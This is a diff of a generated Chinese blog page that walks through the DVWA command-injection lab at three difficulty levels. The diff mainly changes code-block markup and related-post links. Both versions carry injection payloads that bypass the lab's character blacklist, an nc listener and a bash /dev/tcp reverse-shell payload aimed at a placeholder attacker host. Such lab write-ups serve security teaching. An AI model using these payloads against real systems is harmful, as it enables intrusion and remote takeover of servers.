@@ -415,15 +415,8 @@
 <h3 id="low">Low</h3>
 <p>这个版本就是属于喂啥吃啥的类型</p>
 <p>简单写一个payload</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> 127.0.0.1<span class="p">;</span>whoami
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_22-49.png"
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">127.0.0.1<span class="p">;</span>whoami
+</span></span></code></pre></div><p><img src="/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_22-49.png"
 	width="855"
 	height="391"
 	srcset="/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_22-49_hufe0cb1fd327a0239801ca43bcf591fec_65078_480x0_resize_box_3.png 480w, /p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_22-49_hufe0cb1fd327a0239801ca43bcf591fec_65078_1024x0_resize_box_3.png 1024w"
@@ -439,39 +432,18 @@
 ></p>
 <h3 id="medium">Medium</h3>
 <p>看一眼源码</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// Set blacklist
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$substitutions</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
-</span></span><span class="line"><span class="cl">        <span class="s1">&#39;&amp;&amp;&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="s1">&#39;;&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="c1">// Remove any of the charactars in the array (blacklist).
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$target</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="nx">array_keys</span><span class="p">(</span> <span class="nv">$substitutions</span> <span class="p">),</span> <span class="nv">$substitutions</span><span class="p">,</span> <span class="nv">$target</span> <span class="p">);</span> 
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>发现它过滤了黑名单中的<code>&amp;&amp;</code>和<code>;</code>字符</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="c1">// Set blacklist
+</span></span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1"></span>    <span class="nv">$substitutions</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">        <span class="s1">&#39;&amp;&amp;&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">        <span class="s1">&#39;;&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl">
+</span></span><span class="line"><span class="ln">7</span><span class="cl">    <span class="c1">// Remove any of the charactars in the array (blacklist).
+</span></span></span><span class="line"><span class="ln">8</span><span class="cl"><span class="c1"></span>    <span class="nv">$target</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="nx">array_keys</span><span class="p">(</span> <span class="nv">$substitutions</span> <span class="p">),</span> <span class="nv">$substitutions</span><span class="p">,</span> <span class="nv">$target</span> <span class="p">);</span> 
+</span></span></code></pre></div><p>发现它过滤了黑名单中的<code>&amp;&amp;</code>和<code>;</code>字符</p>
 <p>换成黑名单中没有否字符即可</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> <span class="o">||</span>whoami
-</span></span></code></pre></td></tr></table>
-</div>
-</div><blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl"> <span class="o">||</span>whoami
+</span></span></code></pre></div><blockquote>
 <p>P.S. 因为没有ip,所以Ping执行失败了，所以执行后面的<code>whoami</code>命令</p>
 </blockquote>
 <p><img src="/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_22-55.png"
@@ -490,54 +462,26 @@
 ></p>
 <h3 id="high">High</h3>
 <p>这次的黑名单已经很全了</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// Set blacklist
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$substitutions</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
-</span></span><span class="line"><span class="cl">        <span class="s1">&#39;&amp;&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="s1">&#39;;&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="s1">&#39;| &#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="s1">&#39;-&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="s1">&#39;$&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="s1">&#39;(&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="s1">&#39;)&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="s1">&#39;`&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="s1">&#39;||&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="c1">// Remove any of the characters in the array (blacklist).
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$target</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="nx">array_keys</span><span class="p">(</span> <span class="nv">$substitutions</span> <span class="p">),</span> <span class="nv">$substitutions</span><span class="p">,</span> <span class="nv">$target</span> <span class="p">);</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>不过捏，细心的朋友应该发现了，这个容易手滑的开发者做了一个有大病的事情</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1">// Set blacklist
+</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="c1"></span>    <span class="nv">$substitutions</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">        <span class="s1">&#39;&amp;&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">        <span class="s1">&#39;;&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">        <span class="s1">&#39;| &#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">        <span class="s1">&#39;-&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">        <span class="s1">&#39;$&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="s1">&#39;(&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="s1">&#39;)&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="s1">&#39;`&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="s1">&#39;||&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">
+</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="c1">// Remove any of the characters in the array (blacklist).
+</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span>    <span class="nv">$target</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="nx">array_keys</span><span class="p">(</span> <span class="nv">$substitutions</span> <span class="p">),</span> <span class="nv">$substitutions</span><span class="p">,</span> <span class="nv">$target</span> <span class="p">);</span>
+</span></span></code></pre></div><p>不过捏，细心的朋友应该发现了，这个容易手滑的开发者做了一个有大病的事情</p>
 <p>程序过滤了<code>| </code>(有空格)，而不是<code>|</code>&hellip;</p>
 <p>所以我们完全可以用<code>|</code>绕过去</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> 127.0.0.1<span class="p">|</span>whoami
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-02.png"
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">127.0.0.1<span class="p">|</span>whoami
+</span></span></code></pre></div><p><img src="/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-02.png"
 	width="841"
 	height="212"
 	srcset="/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-02_hu479e066281f79b3f83f1f55e7ce07f0e_19306_480x0_resize_box_3.png 480w, /p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-02_hu479e066281f79b3f83f1f55e7ce07f0e_19306_1024x0_resize_box_3.png 1024w"
@@ -553,15 +497,8 @@
 <p>为了能更优雅，舒适地控制目标机器</p>
 <p>我们可以弹个shell</p>
 <p>先在攻击的机器上用nc监听一个端口(端口任意，只要不被其他东西占用)</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> nc -lvnp 端口号
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-13.png"
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">nc -lvnp 端口号
+</span></span></code></pre></div><p><img src="/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-13.png"
 	width="426"
 	height="147"
 	srcset="/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-13_hubcf693454ead4c4bc9aeae9e23931aca_64761_480x0_resize_box_3.png 480w, /p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-13_hubcf693454ead4c4bc9aeae9e23931aca_64761_1024x0_resize_box_3.png 1024w"
@@ -576,15 +513,8 @@
 	
 ></p>
 <p>在靶机输入payload</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> 127.0.0.1<span class="p">|</span>bash -i &gt;<span class="p">&amp;</span> /dev/tcp/攻击机器ip/端口号 0&gt;<span class="p">&amp;</span><span class="m">1</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-23.png"
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">127.0.0.1<span class="p">|</span>bash -i &gt;<span class="p">&amp;</span> /dev/tcp/攻击机器ip/端口号 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span></code></pre></div><p><img src="/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-23.png"
 	width="1048"
 	height="357"
 	srcset="/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-23_hu93ea951212091df947f4a77998c020e5_381998_480x0_resize_box_3.png 480w, /p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/2022-09-02_23-23_hu93ea951212091df947f4a77998c020e5_381998_1024x0_resize_box_3.png 1024w"
@@ -650,6 +580,30 @@
     <h2 class="section-title">Related content</h2>
     <div class="related-content">
         <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">
+        
+        
+            <div class="article-image">
+                <img src="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/cover.7a00d4ec355b0228bf22cadbfd4376f9_hub6d28757c33c1ef5c0f635b7b627146b_864309_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Web安全:文件包含漏洞"
+                        
+                        data-hash="md5-egDU7DVbAii/Isrb/UN2&#43;Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Web安全:文件包含漏洞</h2>
+        </div>
+    </a>
+</article>
+
             
                 
 <article class="has-image">
@@ -742,30 +696,6 @@
 
         <div class="article-details">
             <h2 class="article-title">PWN! PWN! PANG! Part6 --- ROP</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/pwn-pwn-pang-part5---ret2shellcode/">
-        
-        
-            <div class="article-image">
-                <img src="/p/pwn-pwn-pang-part5---ret2shellcode/cover.5f05682fb9be023753c14c7bf7b130e4_hu3166df2cafdca7684e1b9dcf3608c6c9_2294292_250x150_fill_q75_box_smart1.jpg" 
-                        width="250" 
-                        height="150" 
-                        loading="lazy"
-                        alt="Featured image of post PWN! PWN! PANG! Part5 --- ret2shellcode"
-                        
-                        data-hash="md5-XwVoL7m&#43;AjdTwUx797Ew5A==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">PWN! PWN! PANG! Part5 --- ret2shellcode</h2>
         </div>
     </a>
 </article>
